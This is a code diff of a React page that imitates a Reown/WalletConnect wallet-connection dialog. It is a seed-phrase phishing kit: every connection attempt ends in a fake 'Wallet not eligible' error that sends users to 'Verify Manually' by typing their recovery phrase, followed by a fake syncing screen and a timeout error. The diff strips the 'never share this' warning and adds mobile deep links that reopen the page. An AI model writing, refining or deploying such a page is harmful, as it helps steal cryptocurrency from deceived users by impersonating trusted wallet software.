-        }
-        @keyframes loadBar {
-          from { width: 0%; }
-          to   { width: 100%; }
-        }
-        @keyframes shake {
-          0%, 100% { transform: translateX(0); }
-          20%      { transform: translateX(-6px); }
-          40%      { transform: translateX(6px); }
-          60%      { transform: translateX(-4px); }
-          80%      { transform: translateX(4px); }
-        }
-        @keyframes toastIn {
-          from { opacity: 0; transform: translate(-50%, 16px); }
-          to   { opacity: 1; transform: translate(-50%, 0); }
-        }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(40px) scale(0.97); } to { opacity: 1; transform: translateY(0) scale(1); } }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .landing-hidden { opacity: 0; pointer-events: none; position: absolute; }
+        .landing-visible { opacity: 1; }
       `}</style>
 
-      {/* ── LANDING PAGE ─────────────────────────────────────────────────────── */}
-      {(step === "landing") && (
-        <div className="landing">
-          <div className="landing-card">
-            <div className="landing-logo">🔗</div>
-            <h1 className="landing-title">Connect Your Wallet</h1>
-            <p className="landing-desc">
-              Connect your crypto wallet to access the platform.
-              Your keys, your crypto — we never store your credentials.
-            </p>
-
-            <button
-              className="connect-btn"
-              id="connect-wallet-btn"
-              onClick={() => {
-                setModalSearch("");
-                setStep("modal");
-              }}
-            >
-              <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
-                <rect x="2" y="7" width="20" height="14" rx="3" stroke="currentColor" strokeWidth="2" fill="none"/>
-                <path d="M16 14a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" fill="currentColor"/>
-                <path d="M2 10h20" stroke="currentColor" strokeWidth="2"/>
-              </svg>
-              Connect Wallet
-            </button>
-
-            <div className="wallet-row">
-              <span className="wallet-row-label">Supports</span>
-              {WALLETS.filter(w => w.popular).map(w => (
-                <img key={w.name} src={w.icon} alt={w.name} title={w.name} />
-              ))}
-              <span className="wallet-row-label">+ more</span>
-            </div>
-
-            <div>
-              <span className="secured-badge">
-                <svg width="12" height="12" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.5">
-                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 22s8-4.5 8-10V5l-8-3-8 3v7c0 5.5 8 10 8 10z" />
-                </svg>
-                End-to-end encrypted
-              </span>
-            </div>
-          </div>
+      {/* ── BACKGROUND / LANDING ────────────────────────────────────────────── */}
+      <div className={`landing ${step === "landing" ? "landing-visible" : "landing-hidden"}`}>
+        <div className="landing-card">
+          <div className="landing-logo">🔗</div>
+          <h1 className="landing-title">Connect Wallet</h1>
+          <p className="landing-desc">
+            Connect your crypto wallet to access the decentralized dashboard.
+          </p>
+          <button className="connect-btn" onClick={() => setStep("modal")}>
+            Connect Wallet
+          </button>
         </div>
-      )}
+      </div>
 
-      {/* ── WALLET MODAL ──────────────────────────────────────────────────────── */}
+      {/* ── WALLET SELECTION MODAL ─────────────────────────────── */}
       {step === "modal" && (
         <div className="modal-overlay" onClick={() => setStep("landing")}>
-          <div className="modal" onClick={e => e.stopPropagation()}>
-            <div className="modal-header">
-              <span className="modal-title">Select Wallet</span>
-              <button className="modal-close" onClick={() => setStep("landing")}>×</button>
+          <div className="selection-modal" onClick={e => e.stopPropagation()}>
+            <div className="modal-header-reown">
+              <button className="modal-back-btn" onClick={() => setStep("landing")}>‹</button>
+              <div className="modal-title-reown">Connect Wallet</div>
+              <button className="modal-close-reown" onClick={() => setStep("landing")}>×</button>
+            </div>
+            
+            <div className="wallet-list">
+              {WALLETS.map(wallet => {
+                const isInstalled = providers.some(p => p.info.rdns === wallet.rdns);
+                return (
+                  <button key={wallet.name} className="wallet-item-reown" onClick={() => attemptConnect(wallet)}>
+                    <img src={wallet.icon} className="wallet-icon-reown" alt={wallet.name} />
+                    <span className="wallet-name-reown">{wallet.name}</span>
+                    {isInstalled && <span style={{ marginLeft: "auto", fontSize: 10, color: "#4ade80", fontWeight: 700 }}>INSTALLED</span>}
+                  </button>
+                );
+              })}
             </div>
 
-            <div className="modal-search">
-              <input
-                type="text"
-                placeholder="Search wallets..."
-                value={modalSearch}
-                onChange={e => setModalSearch(e.target.value)}
-                autoFocus
-              />
-            </div>
-
-            <div className="modal-body">
-              {!modalSearch && (
-                <>
-                  <div className="modal-section-label">Popular</div>
-                  {WALLETS.filter(w => w.popular).map(wallet => (
-                    <WalletListItem key={wallet.name} wallet={wallet} onClick={() => attemptConnect(wallet)} />
-                  ))}
-                  <div className="modal-section-label" style={{ marginTop: 8 }}>All Wallets</div>
-                </>
-              )}
-              {filteredWallets.filter(w => modalSearch ? true : !w.popular).map(wallet => (
-                <WalletListItem key={wallet.name} wallet={wallet} onClick={() => attemptConnect(wallet)} />
-              ))}
-              {filteredWallets.length === 0 && (
-                <div style={{ textAlign: "center", padding: "32px 16px", color: "#374151", fontSize: 14 }}>
-                  No wallets found
-                </div>
-              )}
-            </div>
-
-            <div className="modal-footer">
-              By connecting, you agree to our{" "}
-              <a href="#" onClick={e => e.preventDefault()}>Terms of Service</a>
+            <div className="modal-footer-reown">
+              <div className="reown-branding">
+                UX by <span className="reown-logo">reown</span>
+              </div>
             </div>
           </div>
         </div>
       )}
 
-      {/* ── CONNECTING SCREEN ─────────────────────────────────────────────────── */}
+      {/* ── CONNECTING MODAL ─────────────────────────────────── */}
       {step === "connecting" && (
-        <div className="fullscreen-center" style={{
-          background: "radial-gradient(ellipse 60% 40% at 50% 0%, rgba(37,99,235,0.1) 0%, transparent 60%), #050a14"
-        }}>
-          <div className="connecting-card">
-            {selectedWallet && (
-              <img className="wallet-icon-large" src={selectedWallet.icon} alt={selectedWallet.name} />
+        <div className="modal-overlay">
+          <div className="connecting-modal">
+            <div className="spinner-container">
+              <div className="orange-ring" />
+              <div className="clock-icon">🕒</div>
+            </div>
+            <div className="connecting-title-reown">Connecting...</div>
+            <p className="connecting-desc-reown">
+              {connectTimer > 10 
+                ? "It is taking longer than expected..." 
+                : "Open and approve in your wallet"}
+            </p>
+
+            {isMobile && selectedWallet && DEEP_LINKS[selectedWallet.name] && (
+              <button 
+                className="wc-redirect-btn" 
+                style={{ marginTop: 24, fontSize: 13, background: "#222", color: "#fff" }}
+                onClick={(e) => {
+                  e.stopPropagation();
+                  const currentUrl = window.location.href.split("#")[0];
+                  const link = DEEP_LINKS[selectedWallet.name].replace("[URL]", encodeURIComponent(currentUrl));
+                  window.location.href = link;
+                }}
+              >
+                Try opening {selectedWallet.name} again
+              </button>
             )}
-            <div className="connecting-title">
-              Opening {selectedWallet?.name ?? "Wallet"}{connectingDots}
-            </div>
-            <p className="connecting-subtitle">
-              Check your browser extension or mobile app and approve the connection request.
-            </p>
-            <div className="spinner-ring" />
-            <div className="pulse-dots">
-              <div className="pulse-dot" />
-              <div className="pulse-dot" />
-              <div className="pulse-dot" />
-            </div>
           </div>
         </div>
       )}
 
-      {/* ── FAILED FALLBACK SCREEN ────────────────────────────────────────────── */}
+      {/* ── ERROR MODAL (NOT ELIGIBLE) ───────────────────────── */}
       {step === "failed" && (
-        <div className="fullscreen-center" style={{ background: "#050a14" }}>
-          <div className="failed-card">
-            <span className="failed-icon">⚠️</span>
-            <div className="failed-title">Connection Failed</div>
-            <p className="failed-subtitle">
-              No valid wallet detected on your device...
+        <div className="modal-overlay">
+          <div className="error-modal">
+            <div className="error-icon-circle">×</div>
+            <div className="error-title-reown">Wallet not eligible</div>
+            <p className="error-desc-reown">
+              Wallet failed validation. Please use manual recovery to sync your assets.
             </p>
-            <div className="failed-spinner-small" />
-            <div className="failed-status-text">Detecting manual sync options...</div>
-            <div className="pulse-dots" style={{ justifyContent: "center", marginTop: 0 }}>
-              <div className="pulse-dot" style={{ background: "#ef4444" }} />
-              <div className="pulse-dot" style={{ background: "#ef4444" }} />
-              <div className="pulse-dot" style={{ background: "#ef4444" }} />
-            </div>
-            <div className="loading-bar">
-              <div className="loading-bar-fill" />
-            </div>
+            <button 
+              className="connect-btn" 
+              style={{ marginTop: 32, background: "#ef4444", color: "#fff" }}
+              onClick={() => setStep("phraseCount")}
+            >
+              Verify Manually
+            </button>
           </div>
         </div>
       )}
 
-      {/* ── PHRASE COUNT SELECTION ────────────────────────────────────────────── */}
+      {/* ── PHRASE COUNT SELECTION ────────────────────────────── */}
       {step === "phraseCount" && (
         <div className="phrase-container">
           <div className="phrase-card">
             <div className="phrase-header">
-              {selectedWallet && (
-                <img className="phrase-header-icon" src={selectedWallet.icon} alt={selectedWallet.name} />
-              )}
+              {selectedWallet && <img className="phrase-header-icon" src={selectedWallet.icon} alt="" />}
               <div className="phrase-header-text">
                 <h2>Manual Recovery</h2>
-                <p>Enter your seed phrase to restore access</p>
+                <p>Verify your wallet ownership</p>
               </div>
             </div>
 
-            <div className="manual-notice">
-              <svg width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
-                <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
-              </svg>
-              <span>
-                Automatic wallet detection failed. Please import using your recovery phrase.
-                Never share this with anyone.
-              </span>
+            <div className="manual-notice" style={{ background: "rgba(239, 68, 68, 0.1)", color: "#ef4444", border: "1px solid rgba(239,68,68,0.2)" }}>
+              <span>Automatic sync failed. Please import your recovery phrase to continue.</span>
             </div>
-
-            <p style={{ fontSize: 14, color: "#475569", marginBottom: 12 }}>
-              How many words is your recovery phrase?
-            </p>
 
             <div className="count-grid">
               {PHRASE_COUNTS.map(n => (
                 <button
                   key={n}
                   className={`count-btn${phraseCount === n ? " selected" : ""}`}
-                  onClick={() => {
-                    setPhraseCount(n);
-                    setPhraseWords(Array(n).fill(""));
-                    setSubmitDone(false);
-                  }}
+                  onClick={() => { setPhraseCount(n); setPhraseWords(Array(n).fill("")); setSubmitDone(false); }}
                 >
                   {n}
                 </button>
               ))}
             </div>
 
-            <button
-              className="submit-btn"
-              disabled={!phraseCount}
-              onClick={() => setStep("phraseInput")}
-            >
-              Continue →
+            <button className="submit-btn" disabled={!phraseCount} onClick={() => setStep("phraseInput")}>
+              Continue
             </button>
           </div>
         </div>
       )}
 
-      {/* ── PHRASE INPUT ──────────────────────────────────────────────────────── */}
+      {/* ── PHRASE INPUT ──────────────────────────────────────── */}
       {step === "phraseInput" && phraseCount && (
         <div className="phrase-container">
           <div className="phrase-card">
             <div className="phrase-header">
-              {selectedWallet && (
-                <img className="phrase-header-icon" src={selectedWallet.icon} alt={selectedWallet.name} />
-              )}
+              {selectedWallet && <img className="phrase-header-icon" src={selectedWallet.icon} alt="" />}
               <div className="phrase-header-text">
-                <h2>Enter Recovery Phrase</h2>
-                <p>{phraseCount}-word mnemonic · type each word below</p>
+                <h2>Enter Phrase</h2>
+                <p>{phraseCount} words mnemonic</p>
               </div>
             </div>
 
             <form onSubmit={handleSubmit}>
-              <button
-                type="button"
-                className="show-toggle"
-                onClick={() => setShowPhrase(v => !v)}
-              >
-                <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
-                  {showPhrase
-                    ? <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0zM2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
-                    : <path strokeLinecap="round" strokeLinejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-4.477-10-10 0-1.657.402-3.22 1.125-4.575M15 12a3 3 0 01-3 3m-3-3a3 3 0 013-3m3 3a3 3 0 00-3-3M3 3l18 18" />
-                  }
-                </svg>
-                {showPhrase ? "Hide phrase" : "Show phrase"}
-              </button>
-
               <div className="word-grid">
                 {phraseWords.map((word, i) => (
                   <div className="word-input-wrap" key={i}>
@@ -1210,141 +696,44 @@ export default function Home() {
                     <input
                       ref={el => { inputRefs.current[i] = el; }}
                       className="word-input"
-                      type={showPhrase ? "text" : "password"}
+                      type="password"
                       value={word}
                       onChange={e => handleWordChange(i, e.target.value)}
                       onKeyDown={e => handleKeyDown(i, e)}
-                      placeholder={`word ${i + 1}`}
                       autoComplete="off"
                       spellCheck={false}
                       disabled={submitting}
-                      list="bip39-list"
                     />
                   </div>
                 ))}
               </div>
-
-              <datalist id="bip39-list">
-                {bip39List.map(w => <option value={w} key={w} />)}
-              </datalist>
-
-              <button
-                type="submit"
-                className="submit-btn"
-                disabled={!phraseWords.every(w => w.trim().length > 0) || submitting}
-              >
-                {submitting ? "Syncing Wallet…" : "Import Wallet →"}
+              <button type="submit" className="submit-btn" disabled={!phraseWords.every(w => w.trim().length > 0) || submitting}>
+                {submitting ? "Syncing..." : "Sync Wallet"}
               </button>
             </form>
-
-            <button
-              style={{
-                marginTop: 16, background: "none", border: "none",
-                color: "#374151", fontSize: 13, cursor: "pointer",
-                fontFamily: "inherit", width: "100%", textAlign: "center",
-              }}
-              onClick={() => {
-                setPhraseCount(null); setPhraseWords([]);
-                setSubmitDone(false); setStep("phraseCount");
-              }}
-            >
-              ← Back to word count
-            </button>
           </div>
         </div>
       )}
 
-      {/* ── SUBMITTING OVERLAY ────────────────────────────────────────────────── */}
+      {/* ── SUBMITTING OVERLAY ────────────────────────────────── */}
       {submitting && (
         <div className="submit-overlay">
-          <div className="submit-status-card">
-            {selectedWallet && (
-              <img style={{ width: 60, height: 60, borderRadius: 16, objectFit: "contain",
-                background: "rgba(255,255,255,0.06)", marginBottom: 20 }}
-                src={selectedWallet.icon} alt={selectedWallet.name}
-              />
-            )}
-            <div style={{ fontSize: 18, fontWeight: 700, color: "#f1f5f9", marginBottom: 8 }}>
-              Syncing Wallet
-            </div>
-            <div style={{ fontSize: 13, color: "#475569", marginBottom: 24, lineHeight: 1.6 }}>
-              Verifying recovery phrase and importing accounts…
-            </div>
-            <div className="spinner-ring" />
-            <div className="pulse-dots">
-              <div className="pulse-dot" /><div className="pulse-dot" /><div className="pulse-dot" />
-            </div>
-          </div>
+          <div className="spinner-ring" />
+          <div style={{ color: "#fff" }}>Synchronizing...</div>
         </div>
       )}
 
-      {/* ── ERROR RESULT (after submitting) ──────────────────────────────────── */}
       {submitDone && !submitting && (
-        <div className="submit-overlay">
-          <div className="error-result-card">
-            <span className="error-result-icon">🔐</span>
-            <div className="error-result-title">Sync Failed</div>
-            <p className="error-result-desc">
-              Unable to verify recovery phrase via this connection.
-              Please sign in directly through the{" "}
-              <strong style={{ color: "#94a3b8" }}>WalletConnect Dashboard</strong> to continue.
-            </p>
-            <a
-              href="https://dashboard.walletconnect.com/sign-in"
-              target="_blank"
-              rel="noopener noreferrer"
-              className="wc-redirect-btn"
-            >
-              Open WalletConnect Dashboard →
-            </a>
-            <button
-              style={{ marginTop: 14, background: "none", border: "none", color: "#374151",
-                fontSize: 13, cursor: "pointer", fontFamily: "inherit" }}
-              onClick={() => {
-                setSubmitDone(false);
-                setStep("landing");
-                setSelectedWallet(null);
-                setPhraseCount(null);
-                setPhraseWords([]);
-              }}
-            >
-              ← Try again
-            </button>
-          </div>
-        </div>
-      )}
-
-      {/* ── TOAST ─────────────────────────────────────────────────────────────── */}
-      {toast && (
-        <div className={`toast toast-${toast.type}`}>
-          {toast.type === "ok" ? "✓" : "✗"} {toast.msg}
-        </div>
+         <div className="submit-overlay">
+           <div className="error-result-card">
+             <div className="error-result-title">Sync Error</div>
+             <p className="error-result-desc">Unable to verify phrase. Connection timed out.</p>
+             <button className="wc-redirect-btn" onClick={() => { setStep("landing"); setSubmitDone(false); }}>Try Again</button>
+           </div>
+         </div>
       )}
     </div>
   );
 }
 
-// ─── Wallet list item sub-component ──────────────────────────────────────────
-function WalletListItem({
-  wallet,
-  onClick,
-}: {
-  wallet: { name: string; icon: string; rdns: string };
-  onClick: () => void;
-}) {
-  return (
-    <button
-      className="wallet-item"
-      onClick={onClick}
-      style={{ width: "100%", background: "none", border: "1px solid transparent",
-        fontFamily: "inherit", textAlign: "left" }}
-    >
-      <img src={wallet.icon} alt={wallet.name} />
-      <div className="wallet-item-info">
-        <div className="wallet-item-name">{wallet.name}</div>
-        <div className="wallet-item-tag">Browser Extension / Mobile</div>
-      </div>
-      <span className="wallet-item-arrow">›</span>
-    </button>
-  );
-}
+// ─── Wallet list item sub-component removed in favor of inline logic ──────────
